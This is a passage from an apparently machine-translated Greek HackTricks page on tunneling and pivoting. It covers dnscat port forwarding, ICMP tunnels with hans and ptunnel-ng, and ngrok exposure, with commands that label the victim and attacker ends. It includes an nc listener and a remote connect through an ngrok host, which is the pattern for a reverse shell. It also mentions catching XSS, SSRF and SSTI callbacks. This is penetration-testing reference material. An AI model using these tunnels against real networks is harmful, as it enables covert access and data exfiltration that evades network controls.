Once you have set up the DNS server, you can use dnscat to establish a port forwarding tunnel. This involves running dnscat on both the client and server machines, specifying the DNS server and the desired ports to forward.

Αφού έχετε ρυθμίσει τον DNS διακομιστή, μπορείτε να χρησιμοποιήσετε το dnscat για να δημιουργήσετε έναν σωλήνα προώθησης θύρας. Αυτό περιλαμβάνει την εκτέλεση του dnscat τόσο στον πελάτη όσο και στον διακομιστή, καθορίζοντας τον DNS διακομιστή και τις επιθυμητές θύρες προώθησης.

Once the tunnel is established, you can access the service running on the remote machine by connecting to the forwarded port on the client machine.

Αφού ο σωλήνας έχει δημιουργηθεί, μπορείτε να αποκτήσετε πρόσβαση στην υπηρεσία που εκτελείται στο απομακρυσμένο μηχάνημα συνδέοντας στην προωθημένη θύρα στον πελάτη.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Αλλαγή DNS στο proxychains

Το proxychains παρεμβαίνει στην κλήση `gethostbyname` της βιβλιοθήκης libc και δρομολογεί το αίτημα DNS tcp μέσω του socks proxy. Από προεπιλογή, ο DNS διακομιστής που χρησιμοποιεί το proxychains είναι το **4.2.2.2** (προκαθορισμένο). Για να το αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Εάν βρίσκεστε σε ένα περιβάλλον **Windows**, μπορείτε να ορίσετε την IP του **domain controller**.

## Σήραγγες στην Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Σήραγγες

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Και στα δύο συστήματα απαιτείται δικαιώματα διαχειριστή για τη δημιουργία προσαρμογέα tun και τη δρομολόγηση δεδομένων μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) είναι ένα εργαλείο για να εκθέσετε λύσεις στο Διαδίκτυο με μία εντολή γραμμής εντολών.**
*Οι URI εκθέσεων είναι όπως:* **UID.ngrok.io**

### Εγκατάσταση

- Δημιουργία λογαριασμού: https://ngrok.com/signup
- Λήψη πελάτη:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Είναι επίσης δυνατόν να προστεθεί πιστοποίηση και TLS, αν είναι απαραίτητο.*

#### Τούνελινγκ TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Αποκάλυψη αρχείων με HTTP

Η αποκάλυψη αρχείων μέσω HTTP είναι μια τεχνική που μπορεί να χρησιμοποιηθεί για να αποκτηθεί πρόσβαση σε αρχεία μέσω του πρωτοκόλλου HTTP. Αυτή η τεχνική είναι χρήσιμη όταν ένας εξυπηρετητής δεν έχει δημόσια προσβάσιμα αρχεία, αλλά επιτρέπει την ανάγνωση αρχείων μέσω HTTP.

Για να αποκαλύψετε ένα αρχείο μέσω HTTP, μπορείτε να χρησιμοποιήσετε έναν εξυπηρετητή HTTP που θα εξυπηρετεί το αρχείο σαν απόκριση σε αιτήματα HTTP. Αυτό μπορεί να γίνει με τη χρήση εργαλείων όπως το `python -m SimpleHTTPServer` ή το `php -S`.

Αφού ξεκινήσετε τον εξυπηρετητή HTTP, μπορείτε να αποκτήσετε πρόσβαση στο αρχείο μέσω του προγράμματος περιήγησής σας, χρησιμοποιώντας τη διεύθυνση URL που παρέχεται από τον εξυπηρετητή. Αυτό θα σας επιτρέψει να δείτε, να κατεβάσετε ή να αλληλεπιδράσετε με το αρχείο μέσω του προγράμματος περιήγησής σας.

Είναι σημαντικό να σημειωθεί ότι η αποκάλυψη αρχείων μέσω HTTP μπορεί να αποκαλύψει ευαίσθητες πληροφορίες, επομένως πρέπει να χρησιμοποιείται με προσοχή και μόνο όταν είναι απαραίτητο.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Καταγραφή των κλήσεων HTTP

*Χρήσιμο για XSS, SSRF, SSTI ...*
Απευθείας από την έξοδο (stdout) ή μέσω της διεπαφής HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Σήραγγα για εσωτερική υπηρεσία HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Απλό παράδειγμα διαμόρφωσης του αρχείου ngrok.yaml

Ανοίγει 3 τούνελ:
- 2 TCP
- 1 HTTP με έκθεση στατικών αρχείων από το /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Άλλα εργαλεία για έλεγχο

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Δουλεύετε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
